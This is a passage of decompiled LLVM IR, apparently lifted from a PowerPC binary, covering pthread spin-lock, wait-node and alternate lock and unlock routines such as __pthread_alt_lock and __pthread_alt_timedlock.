  %v1_10007e08 = inttoptr i32 %v0_10007e00 to i32*
  %v2_10007e08 = load i32, i32* %v1_10007e08, align 4
  %v4_10007e0c = icmp eq i32 %v2_10007e08, %arg3
  br i1 %v4_10007e0c, label %dec_label_pc_10007e08.dec_label_pc_10007e14.loopexit_crit_edge, label %dec_label_pc_10007e00

dec_label_pc_10007e08.dec_label_pc_10007e14.loopexit_crit_edge: ; preds = %dec_label_pc_10007e00
  br label %dec_label_pc_10007e14

dec_label_pc_10007e14:                            ; preds = %entry, %dec_label_pc_10007ddc, %dec_label_pc_10007e08.dec_label_pc_10007e14.loopexit_crit_edge
  %v1_10007e18 = phi i32 [ %v0_10007e00, %dec_label_pc_10007e08.dec_label_pc_10007e14.loopexit_crit_edge ], [ %v0_10007e081, %dec_label_pc_10007ddc ], [ %tmp, %entry ]
  %v2_10007e14 = load i32, i32* %v1_10007dd8, align 4
  %v2_10007e18 = inttoptr i32 %v1_10007e18 to i32*
  store i32 %v2_10007e14, i32* %v2_10007e18, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v2_10007e08, { 1, 0 }
  uselistorder i32 %v0_10007e00, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10007e14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007e00, { 1, 0 }
}

define i32 @__pthread_acquire(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10007e2c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10007e2c, i32* @r30, align 4
  store i32 0, i32* @r31, align 4
  %v2_10007e4c = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_10007e78

dec_label_pc_10007e40:                            ; preds = %dec_label_pc_10007e78
  %v2_10007e94 = icmp sgt i32 %v0_10007e94, 49
  %v1_10007e44 = add i32 %v0_10007e94, 1
  store i32 %v1_10007e44, i32* @r31, align 4
  store i32 %v2_10007e4c, i32* %r3.global-to-local, align 4
  br i1 %v2_10007e94, label %dec_label_pc_10007e60, label %dec_label_pc_10007e58

dec_label_pc_10007e58:                            ; preds = %dec_label_pc_10007e40
  store i32 ptrtoint (i32* @global_var_10007e5c.261 to i32), i32* @lr, align 4
  %v2_10007e58 = call i32 @sched_yield(i32 %v2_10007e4c, i32 0)
  br label %dec_label_pc_10007e70.backedge

dec_label_pc_10007e60:                            ; preds = %dec_label_pc_10007e40
  store i32 0, i32* %stack_var_-24, align 4
  store i32 0, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10007e70.262 to i32), i32* @lr, align 4
  %v2_10007e6c = call i32 @nanosleep(i32 %v2_10007e4c, i32 0)
  br label %dec_label_pc_10007e70.backedge

dec_label_pc_10007e70.backedge:                   ; preds = %dec_label_pc_10007e60, %dec_label_pc_10007e58
  %storemerge = phi i32 [ %v2_10007e58, %dec_label_pc_10007e58 ], [ %v2_10007e6c, %dec_label_pc_10007e60 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_10007e94.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10007e78

dec_label_pc_10007e78:                            ; preds = %entry, %dec_label_pc_10007e70.backedge
  %v0_10007e94 = phi i32 [ %v0_10007e94.pre, %dec_label_pc_10007e70.backedge ], [ 0, %entry ]
  %v0_10007eac = phi i32 [ %storemerge, %dec_label_pc_10007e70.backedge ], [ %v0_10007e2c, %entry ]
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10007e7c = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10007e7c, label %dec_label_pc_10007e9c, label %dec_label_pc_10007e40

dec_label_pc_10007e9c:                            ; preds = %dec_label_pc_10007e78
  ret i32 %v0_10007eac

; uselistorder directives
  uselistorder i32 %v2_10007e4c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10007e78, { 1, 0 }
}

define i32 @wait_node_free(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 268467920, i32* @lr, align 4
  %v1_10007ecc = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_1002c374.263 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v3_10007ed4 = load i32, i32* @global_var_1002c370.264, align 4
  %v1_10007ed8 = load i32, i32* @r28, align 4
  %v2_10007ed8 = inttoptr i32 %v1_10007ed8 to i32*
  store i32 %v3_10007ed4, i32* %v2_10007ed8, align 4
  %v0_10007edc = load i32, i32* @r28, align 4
  store i32 %v0_10007edc, i32* @global_var_1002c370.264, align 4
  store i32 0, i32* @global_var_1002c374.263, align 4
  ret i32 %v1_10007ecc
}

define i32 @restart.9(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268467988, i32* @lr, align 4
  %v0_10007f10 = call i32 @__pthread_restart_new()
  ret i32 %v0_10007f10

; uselistorder directives
  uselistorder i32 ()* @__pthread_restart_new, { 0, 5, 4, 1, 2, 3 }
}

define i32 @__pthread_alt_unlock(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10007f24 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_10007f3c.outer

dec_label_pc_10007f3c.outer:                      ; preds = %dec_label_pc_10008004, %dec_label_pc_10007ff0, %entry
  %v0_10007fe87.ph = phi i32 [ %tmp, %entry ], [ %v0_10007fe8, %dec_label_pc_10007ff0 ], [ %v0_10007fe8, %dec_label_pc_10008004 ]
  %v1_10007f3c = inttoptr i32 %v0_10007fe87.ph to i32*
  br label %dec_label_pc_10007f3c

dec_label_pc_10007f3c:                            ; preds = %dec_label_pc_10007f3c.outer, %dec_label_pc_10007f50
  %v2_10007f3c = load i32, i32* %v1_10007f3c, align 4
  %v2_10007f40 = icmp ugt i32 %v2_10007f3c, 1
  br i1 %v2_10007f40, label %dec_label_pc_10007f8c.lr.ph, label %dec_label_pc_10007f50

dec_label_pc_10007f50:                            ; preds = %dec_label_pc_10007f3c
  %r9.promoted = load i32, i32* @r9, align 4
  %.pre = xor i32 %r9.promoted, %v2_10007f3c
  %v5_10007f54 = icmp eq i32 %.pre, 0
  store i32 %.pre, i32* @r9, align 4
  br i1 %v5_10007f54, label %dec_label_pc_10008048.loopexit, label %dec_label_pc_10007f3c

dec_label_pc_10007f8c.lr.ph:                      ; preds = %dec_label_pc_10007f3c
  store i32 %v2_10007f3c, i32* @r31, align 4
  store i32 -2147483648, i32* @r27, align 4
  store i32 %v2_10007f3c, i32* @r28, align 4
  store i32 %v0_10007fe87.ph, i32* @r26, align 4
  br label %dec_label_pc_10007f8c

dec_label_pc_10007f8c:                            ; preds = %dec_label_pc_10007f8c.lr.ph, %dec_label_pc_10007fdc.backedge
  %v0_10007fcc = phi i32 [ %v0_10007fe87.ph, %dec_label_pc_10007f8c.lr.ph ], [ %v0_10007fe4, %dec_label_pc_10007fdc.backedge ]
  %v0_10007fe811 = phi i32 [ %v0_10007fe87.ph, %dec_label_pc_10007f8c.lr.ph ], [ %v0_10007fe8, %dec_label_pc_10007fdc.backedge ]
  %v0_10007fd4 = phi i32 [ %v2_10007f3c, %dec_label_pc_10007f8c.lr.ph ], [ %storemerge, %dec_label_pc_10007fdc.backedge ]
  %v1_10007f8c = add i32 %v0_10007fd4, 8
  %v2_10007f8c = inttoptr i32 %v1_10007f8c to i32*
  %v3_10007f8c = load i32, i32* %v2_10007f8c, align 4
  %v3_10007f90 = icmp eq i32 %v3_10007f8c, 0
  br i1 %v3_10007f90, label %dec_label_pc_10007fb8, label %dec_label_pc_10007f98

dec_label_pc_10007f98:                            ; preds = %dec_label_pc_10007f8c
  store i32 268468124, i32* @lr, align 4
  %v3_10007f98 = inttoptr i32 %v0_10007fcc to i32*
  %v4_10007f98 = call i32 @wait_node_dequeue(i32 %v0_10007fe811, i32* %v3_10007f98, i32 %v0_10007fd4)
  %v0_10007f9c = load i32, i32* @r31, align 4
  store i32 268468132, i32* @lr, align 4
  %v1_10007fa0 = inttoptr i32 %v0_10007f9c to i32*
  %v2_10007fa0 = call i32 @wait_node_free(i32* %v1_10007fa0)
  %v0_10007fa4 = load i32, i32* @r29, align 4
  %v1_10007fa4 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10007fdc.backedge

dec_label_pc_10007fb8:                            ; preds = %dec_label_pc_10007f8c
  %v1_10007fb8 = add i32 %v0_10007fd4, 4
  %v2_10007fb8 = inttoptr i32 %v1_10007fb8 to i32*
  %v3_10007fb8 = load i32, i32* %v2_10007fb8, align 4
  store i32 %v3_10007fb8, i32* @r9, align 4
  %v1_10007fbc = add i32 %v3_10007fb8, 24
  %v2_10007fbc = inttoptr i32 %v1_10007fbc to i32*
  %v3_10007fbc = load i32, i32* %v2_10007fbc, align 4
  %v1_10007fc0 = load i32, i32* @r27, align 4
  %v2_10007fc0 = icmp slt i32 %v3_10007fbc, %v1_10007fc0
  br i1 %v2_10007fc0, label %dec_label_pc_10007fd4, label %dec_label_pc_10007fc8

dec_label_pc_10007fc8:                            ; preds = %dec_label_pc_10007fb8
  store i32 %v3_10007fbc, i32* @r27, align 4
  store i32 %v0_10007fcc, i32* @r26, align 4
  store i32 %v0_10007fd4, i32* @r28, align 4
  br label %dec_label_pc_10007fd4

dec_label_pc_10007fd4:                            ; preds = %dec_label_pc_10007fb8, %dec_label_pc_10007fc8
  store i32 %v0_10007fd4, i32* @r29, align 4
  br label %dec_label_pc_10007fdc.backedge

dec_label_pc_10007fdc.backedge:                   ; preds = %dec_label_pc_10007fd4, %dec_label_pc_10007f98
  %v0_10007fe8 = phi i32 [ %v1_10007fa4, %dec_label_pc_10007f98 ], [ %v0_10007fe811, %dec_label_pc_10007fd4 ]
  %v0_10007fe4 = phi i32 [ %v0_10007fa4, %dec_label_pc_10007f98 ], [ %v0_10007fd4, %dec_label_pc_10007fd4 ]
  %storemerge.in = inttoptr i32 %v0_10007fe4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_10007fdc = icmp eq i32 %storemerge, 1
  br i1 %v3_10007fdc, label %dec_label_pc_10007ff0, label %dec_label_pc_10007f8c

dec_label_pc_10007ff0:                            ; preds = %dec_label_pc_10007fdc.backedge
  %v0_10007ff4.pre = load i32, i32* @r27, align 4
  %v4_10007ff4 = icmp eq i32 %v0_10007ff4.pre, -2147483648
  br i1 %v4_10007ff4, label %dec_label_pc_10007f3c.outer, label %dec_label_pc_10008004

dec_label_pc_10008004:                            ; preds = %dec_label_pc_10007ff0
  %v0_10007ffc = load i32, i32* @r28, align 4
  %v1_10007ffc = add i32 %v0_10007ffc, 8
  store i32 %v1_10007ffc, i32* @r9, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10008008 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10008008, label %dec_label_pc_10008024, label %dec_label_pc_10007f3c.outer

dec_label_pc_10008024:                            ; preds = %dec_label_pc_10008004
  %v0_10008024 = load i32, i32* @r26, align 4
  store i32 268468272, i32* @lr, align 4
  %v3_1000802c = inttoptr i32 %v0_10007ffc to i32*
  %v4_1000802c = call i32 @wait_node_dequeue(i32 %v0_10008024, i32* %v3_1000802c, i32 %v0_10007ffc)
  %v0_10008030 = load i32, i32* @r28, align 4
  %v1_10008030 = add i32 %v0_10008030, 4
  %v2_10008030 = inttoptr i32 %v1_10008030 to i32*
  %v3_10008030 = load i32, i32* %v2_10008030, align 4
  store i32 %v3_10008030, i32* @r3, align 4
  store i32 %v0_10007f24, i32* @lr, align 4
  %v1_10008044 = call i32 @restart.9(i32 %v3_10008030)
  br label %dec_label_pc_10008048

dec_label_pc_10008048.loopexit:                   ; preds = %dec_label_pc_10007f50
  br label %dec_label_pc_10008048

dec_label_pc_10008048:                            ; preds = %dec_label_pc_10008048.loopexit, %dec_label_pc_10008024
  %v0_10008058 = phi i32 [ %v1_10008044, %dec_label_pc_10008024 ], [ %v2_10007f3c, %dec_label_pc_10008048.loopexit ]
  ret i32 %v0_10008058

; uselistorder directives
  uselistorder i32 %v0_10007ffc, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10007fe4, { 1, 0 }
  uselistorder i32 %v0_10007fe8, { 1, 0, 2 }
  uselistorder i32 %v0_10007fd4, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v2_10007f3c, { 3, 0, 2, 1, 4, 5 }
  uselistorder i32 %v0_10007fe87.ph, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10007f8c, { 1, 0 }
  uselistorder label %dec_label_pc_10007f3c, { 1, 0 }
}

define i32 @suspend.10() local_unnamed_addr {
entry:
  store i32 268468332, i32* @lr, align 4
  %v0_10008068 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10008068

; uselistorder directives
  uselistorder i32 ()* @__pthread_wait_for_restart_signal, { 0, 4, 5, 1, 2, 3, 6 }
}

define i32 @__pthread_alt_lock(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r11, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* @r3, align 4
  br label %dec_label_pc_10008094

dec_label_pc_10008094:                            ; preds = %dec_label_pc_100080d8, %entry
  %v0_10008098 = phi i32 [ %v0_100080984, %dec_label_pc_100080d8 ], [ %arg2, %entry ]
  %v2_10008094 = load i32, i32* %arg1, align 4
  store i32 %v2_10008094, i32* @r9, align 4
  %v3_100080a0 = icmp eq i32 %v2_10008094, 0
  br i1 %v3_100080a0, label %dec_label_pc_100080c4, label %dec_label_pc_100080a8

dec_label_pc_100080a8:                            ; preds = %dec_label_pc_10008094
  %v3_10008098 = icmp eq i32 %v0_10008098, 0
  br i1 %v3_10008098, label %dec_label_pc_100080ac, label %dec_label_pc_100080b0

dec_label_pc_100080ac:                            ; preds = %dec_label_pc_100080a8
  %v0_100080ac = load i32, i32* @r2, align 4
  store i32 %v0_100080ac, i32* @r3, align 4
  br label %dec_label_pc_100080b0

dec_label_pc_100080b0:                            ; preds = %dec_label_pc_100080a8, %dec_label_pc_100080ac
  %v0_100080983 = phi i32 [ %v0_10008098, %dec_label_pc_100080a8 ], [ %v0_100080ac, %dec_label_pc_100080ac ]
  br label %dec_label_pc_100080c4

dec_label_pc_100080c4:                            ; preds = %dec_label_pc_100080b0, %dec_label_pc_10008094
  %v0_100080984 = phi i32 [ %v0_10008098, %dec_label_pc_10008094 ], [ %v0_100080983, %dec_label_pc_100080b0 ]
  %r8.promoted = load i32, i32* @r8, align 4
  %.pre = xor i32 %r8.promoted, %v2_10008094
  %v5_100080c8 = icmp eq i32 %.pre, 0
  br i1 %v5_100080c8, label %dec_label_pc_100080e4, label %dec_label_pc_100080d8

dec_label_pc_100080d8:                            ; preds = %dec_label_pc_100080c4
  store i32 %.pre, i32* @r8, align 4
  br label %dec_label_pc_10008094

dec_label_pc_100080e4:                            ; preds = %dec_label_pc_100080c4
  store i32 0, i32* @r8, align 4
  br i1 %v3_100080a0, label %dec_label_pc_100080f0, label %dec_label_pc_100080ec

dec_label_pc_100080ec:                            ; preds = %dec_label_pc_100080e4
  store i32 ptrtoint (i32* @global_var_100080f0.265 to i32), i32* @lr, align 4
  %v0_100080ec = call i32 @suspend.10()
  br label %dec_label_pc_100080f0

dec_label_pc_100080f0:                            ; preds = %dec_label_pc_100080e4, %dec_label_pc_100080ec
  %v0_10008100 = phi i32 [ %v0_100080984, %dec_label_pc_100080e4 ], [ %v0_100080ec, %dec_label_pc_100080ec ]
  ret i32 %v0_10008100

; uselistorder directives
  uselistorder i32 %v0_10008098, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100080f0, { 1, 0 }
  uselistorder label %dec_label_pc_100080b0, { 1, 0 }
}

define i32 @__pthread_alt_timedlock(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10008108 = load i32, i32* @lr, align 4
  store i32 %v0_10008108, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r28, align 4
  store i32 268468524, i32* @lr, align 4
  %v1_10008128 = call i32 @__pthread_acquire(i32 ptrtoint (i32* @global_var_1002c374.263 to i32))
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v3_10008134 = load i32, i32* @global_var_1002c370.264, align 4
  store i32 %v3_10008134, i32* %r0.global-to-local, align 4
  %v3_10008138 = icmp eq i32 %v3_10008134, 0
  br i1 %v3_10008138, label %dec_label_pc_1000814c, label %dec_label_pc_10008140

dec_label_pc_10008140:                            ; preds = %entry
  store i32 %v3_10008134, i32* @r31, align 4
  %v1_10008144 = inttoptr i32 %v3_10008134 to i32*
  %v2_10008144 = load i32, i32* %v1_10008144, align 4
  store i32 %v2_10008144, i32* %r0.global-to-local, align 4
  store i32 %v2_10008144, i32* @global_var_1002c370.264, align 4
  br label %dec_label_pc_1000814c

dec_label_pc_1000814c:                            ; preds = %entry, %dec_label_pc_10008140
  %v0_10008174.pr = phi i1 [ false, %dec_label_pc_10008140 ], [ true, %entry ]
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @global_var_1002c374.263, align 4
  br i1 %v0_10008174.pr, label %dec_label_pc_10008174, label %dec_label_pc_10008174.thread

dec_label_pc_10008174.thread:                     ; preds = %dec_label_pc_1000814c
  br label %dec_label_pc_1000818c

dec_label_pc_10008174:                            ; preds = %dec_label_pc_1000814c
  store i32 12, i32* @r3, align 4
  store i32 268468592, i32* @lr, align 4
  %v0_1000816c = call i32 @malloc()
  store i32 %v0_1000816c, i32* @r31, align 4
  %v3_10008174 = icmp eq i32 %v0_1000816c, 0
  br i1 %v3_10008174, label %dec_label_pc_1000817c, label %dec_label_pc_1000818c

dec_label_pc_1000817c:                            ; preds = %dec_label_pc_10008174
  %v0_1000817c = load i32, i32* @r29, align 4
  %v0_10008180 = load i32, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10008188.266 to i32), i32* @lr, align 4
  %v2_10008184 = inttoptr i32 %v0_1000817c to i32*
  %v3_10008184 = call i32 @__pthread_alt_lock(i32* %v2_10008184, i32 %v0_10008180)
  br label %dec_label_pc_1000823c

dec_label_pc_1000818c:                            ; preds = %dec_label_pc_10008174, %dec_label_pc_10008174.thread, %dec_label_pc_100081d4
  %v0_1000818c = load i32, i32* @r29, align 4
  %v1_1000818c = inttoptr i32 %v0_1000818c to i32*
  %v2_1000818c = load i32, i32* %v1_1000818c, align 4
  store i32 %v2_1000818c, i32* %r9.global-to-local, align 4
  %v0_10008190 = load i32, i32* @r30, align 4
  store i32 1, i32* @r11, align 4
  %v3_10008198 = icmp eq i32 %v2_1000818c, 0
  br i1 %v3_10008198, label %dec_label_pc_1000818c.dec_label_pc_100081b0_crit_edge, label %dec_label_pc_100081a0

dec_label_pc_1000818c.dec_label_pc_100081b0_crit_edge: ; preds = %dec_label_pc_1000818c
  %v1_100081b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100081c0

dec_label_pc_100081a0:                            ; preds = %dec_label_pc_1000818c
  %v3_10008190 = icmp eq i32 %v0_10008190, 0
  br i1 %v3_10008190, label %dec_label_pc_100081a4, label %dec_label_pc_100081a8

dec_label_pc_100081a4:                            ; preds = %dec_label_pc_100081a0
  %v0_100081a4 = load i32, i32* @r2, align 4
  store i32 %v0_100081a4, i32* @r30, align 4
  br label %dec_label_pc_100081a8

dec_label_pc_100081a8:                            ; preds = %dec_label_pc_100081a0, %dec_label_pc_100081a4
  %v0_100081a8 = phi i32 [ %v0_10008190, %dec_label_pc_100081a0 ], [ %v0_100081a4, %dec_label_pc_100081a4 ]
  %v1_100081a8 = load i32, i32* @r31, align 4
  %v2_100081a8 = add i32 %v1_100081a8, 4
  %v3_100081a8 = inttoptr i32 %v2_100081a8 to i32*
  store i32 %v0_100081a8, i32* %v3_100081a8, align 4
  %v0_100081ac = load i32, i32* @r31, align 4
  store i32 %v0_100081ac, i32* @r11, align 4
  %v0_100081b4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100081c0

dec_label_pc_100081c0:                            ; preds = %dec_label_pc_100081a8, %dec_label_pc_1000818c.dec_label_pc_100081b0_crit_edge
  %v1_100081b4 = phi i32 [ %v1_100081b4.pre, %dec_label_pc_1000818c.dec_label_pc_100081b0_crit_edge ], [ %v0_100081ac, %dec_label_pc_100081a8 ]
  %v0_100081b4 = phi i32 [ 0, %dec_label_pc_1000818c.dec_label_pc_100081b0_crit_edge ], [ %v0_100081b4.pre, %dec_label_pc_100081a8 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100081b4 = inttoptr i32 %v1_100081b4 to i32*
  store i32 %v0_100081b4, i32* %v2_100081b4, align 4
  %v0_100081b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100081b8 = load i32, i32* @r31, align 4
  %v2_100081b8 = add i32 %v1_100081b8, 8
  %v3_100081b8 = inttoptr i32 %v2_100081b8 to i32*
  store i32 %v0_100081b8, i32* %v3_100081b8, align 4
  %v0_100081c4 = load i32, i32* %r9.global-to-local, align 4
  %r0.promoted = load i32, i32* %r0.global-to-local, align 4
  %.pre = xor i32 %r0.promoted, %v0_100081c4
  %v5_100081c4 = icmp eq i32 %.pre, 0
  br i1 %v5_100081c4, label %dec_label_pc_100081e0, label %dec_label_pc_100081d4

dec_label_pc_100081d4:                            ; preds = %dec_label_pc_100081c0
  store i32 %.pre, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000818c

dec_label_pc_100081e0:                            ; preds = %dec_label_pc_100081c0
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100081e0 = icmp eq i32 %v0_100081c4, 0
  br i1 %v3_100081e0, label %dec_label_pc_10008230, label %dec_label_pc_100081e8

dec_label_pc_100081e8:                            ; preds = %dec_label_pc_100081e0
  %v0_100081e8 = load i32, i32* @r28, align 4
  %v0_100081ec = load i32, i32* @r30, align 4
  store i32 268468724, i32* @lr, align 4
  %v2_100081f0 = inttoptr i32 %v0_100081e8 to i32*
  %v3_100081f0 = call i32 @__pthread_timedsuspend_new(i32 %v0_100081ec, i32* %v2_100081f0)
  %v3_100081f4 = icmp eq i32 %v3_100081f0, 0
  br i1 %v3_100081f4, label %dec_label_pc_10008204, label %dec_label_pc_10008230

dec_label_pc_10008204:                            ; preds = %dec_label_pc_100081e8
  %v0_100081fc = load i32, i32* @r31, align 4
  %v1_100081fc = add i32 %v0_100081fc, 8
  store i32 %v1_100081fc, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %r11.promoted = load i32, i32* @r11, align 4
  %v5_10008208 = icmp eq i32 %r11.promoted, 0
  br i1 %v5_10008208, label %dec_label_pc_10008240, label %dec_label_pc_10008228

dec_label_pc_10008228:                            ; preds = %dec_label_pc_10008204
  %v0_10008228 = load i32, i32* @r30, align 4
  store i32 %v0_10008228, i32* @r3, align 4
  store i32 268468784, i32* @lr, align 4
  %v0_1000822c = call i32 @suspend.10()
  br label %dec_label_pc_10008230

dec_label_pc_10008230:                            ; preds = %dec_label_pc_100081e8, %dec_label_pc_100081e0, %dec_label_pc_10008228
  %v0_10008230 = load i32, i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_10008238.267 to i32), i32* @lr, align 4
  %v1_10008234 = inttoptr i32 %v0_10008230 to i32*
  %v2_10008234 = call i32 @wait_node_free(i32* %v1_10008234)
  br label %dec_label_pc_1000823c

dec_label_pc_1000823c:                            ; preds = %dec_label_pc_1000817c, %dec_label_pc_10008230
  br label %dec_label_pc_10008240

dec_label_pc_10008240:                            ; preds = %dec_label_pc_10008204, %dec_label_pc_1000823c
  %v0_10008250 = phi i32 [ 0, %dec_label_pc_10008204 ], [ 1, %dec_label_pc_1000823c ]
  store i32 %v0_10008108, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008250

; uselistorder directives
  uselistorder i32 %v3_10008134, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 10, 9, 3, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 (i32, i32*)* @__pthread_timedsuspend_new, { 1, 0, 2 }
  uselistorder i32 (i32)* @__pthread_acquire, { 1, 0 }
  uselistorder label %dec_label_pc_10008240, { 1, 0 }
  uselistorder label %dec_label_pc_1000823c, { 1, 0 }
  uselistorder label %dec_label_pc_10008230, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100081a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000818c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000814c, { 1, 0 }
}

define i32 @__pthread_unlock() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_10008254 = load i32, i32* @lr, align 4
  br label %dec_label_pc_1000828c

dec_label_pc_10008270:                            ; preds = %dec_label_pc_1000828c
  %.pre = xor i32 %r0.promoted, 1
  %v5_10008274 = icmp eq i32 %.pre, 0
  br i1 %v5_10008274, label %dec_label_pc_1000835c, label %dec_label_pc_1000828c

dec_label_pc_1000828c:                            ; preds = %dec_label_pc_100082f0, %dec_label_pc_10008270, %entry
  %r0.promoted = phi i32 [ %v0_10008254, %entry ], [ %.pre, %dec_label_pc_10008270 ], [ %v1_100082e8, %dec_label_pc_100082f0 ]
  %v0_1000828c = load i32, i32* @r3, align 4
  %v1_1000828c = inttoptr i32 %v0_1000828c to i32*
  %v2_1000828c = load i32, i32* %v1_1000828c, align 4
  store i32 %v2_1000828c, i32* @r10, align 4
  %v3_10008290 = icmp eq i32 %v2_1000828c, 1
  br i1 %v3_10008290, label %dec_label_pc_10008270, label %dec_label_pc_10008298

dec_label_pc_10008298:                            ; preds = %dec_label_pc_1000828c
  %v1_10008298 = call i32 @__asm_rlwinm(i32 %v2_1000828c, i32 0, i32 0, i32 30)
  store i32 %v1_10008298, i32* @r8, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_10008298, i32* %r9.global-to-local, align 4
  %v0_100082a8 = load i32, i32* @r3, align 4
  store i32 %v0_100082a8, i32* @r7, align 4
  store i32 %v0_100082a8, i32* @r11, align 4
  %v3_100082d44 = icmp eq i32 %v1_10008298, 0
  br i1 %v3_100082d44, label %dec_label_pc_100082dc.thread, label %dec_label_pc_100082b4

dec_label_pc_100082dc.thread:                     ; preds = %dec_label_pc_10008298
  br label %dec_label_pc_100082f0

dec_label_pc_100082b4:                            ; preds = %dec_label_pc_10008298, %dec_label_pc_100082c8.dec_label_pc_100082b4_crit_edge
  %v1_100082b8 = phi i32 [ %v1_100082b8.pre, %dec_label_pc_100082c8.dec_label_pc_100082b4_crit_edge ], [ 0, %dec_label_pc_10008298 ]
  %v0_100082c8 = phi i32 [ %v1_100082d0, %dec_label_pc_100082c8.dec_label_pc_100082b4_crit_edge ], [ %v1_10008298, %dec_label_pc_10008298 ]
  %v1_100082b4 = add i32 %v0_100082c8, 24
  %v2_100082b4 = inttoptr i32 %v1_100082b4 to i32*
  %v3_100082b4 = load i32, i32* %v2_100082b4, align 4
  %v2_100082b8 = icmp slt i32 %v3_100082b4, %v1_100082b8
  br i1 %v2_100082b8, label %dec_label_pc_100082c8, label %dec_label_pc_100082c0

dec_label_pc_100082c0:                            ; preds = %dec_label_pc_100082b4
  store i32 %v3_100082b4, i32* %r6.global-to-local, align 4
  %v0_100082c4 = load i32, i32* @r7, align 4
  store i32 %v0_100082c4, i32* @r11, align 4
  br label %dec_label_pc_100082c8

dec_label_pc_100082c8:                            ; preds = %dec_label_pc_100082b4, %dec_label_pc_100082c0
  %v1_100082c8 = add i32 %v0_100082c8, 12
  %v2_100082c8 = inttoptr i32 %v1_100082c8 to i32*
  %v3_100082c8 = load i32, i32* %v2_100082c8, align 4
  store i32 %v1_100082c8, i32* @r7, align 4
  %v1_100082d0 = call i32 @__asm_rlwinm(i32 %v3_100082c8, i32 0, i32 0, i32 30)
  store i32 %v1_100082d0, i32* %r9.global-to-local, align 4
  %v3_100082d4 = icmp eq i32 %v1_100082d0, 0
  br i1 %v3_100082d4, label %dec_label_pc_100082dc, label %dec_label_pc_100082c8.dec_label_pc_100082b4_crit_edge

dec_label_pc_100082c8.dec_label_pc_100082b4_crit_edge: ; preds = %dec_label_pc_100082c8
  %v1_100082b8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100082b4

dec_label_pc_100082dc:                            ; preds = %dec_label_pc_100082c8
  %v0_100082dc.pre = load i32, i32* @r11, align 4
  %v1_100082dc.pre = load i32, i32* @r3, align 4
  %v4_100082dc = icmp eq i32 %v0_100082dc.pre, %v1_100082dc.pre
  br i1 %v4_100082dc, label %dec_label_pc_100082dc.dec_label_pc_100082f0_crit_edge, label %dec_label_pc_10008310

dec_label_pc_100082dc.dec_label_pc_100082f0_crit_edge: ; preds = %dec_label_pc_100082dc
  %v0_100082e4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_100082f0
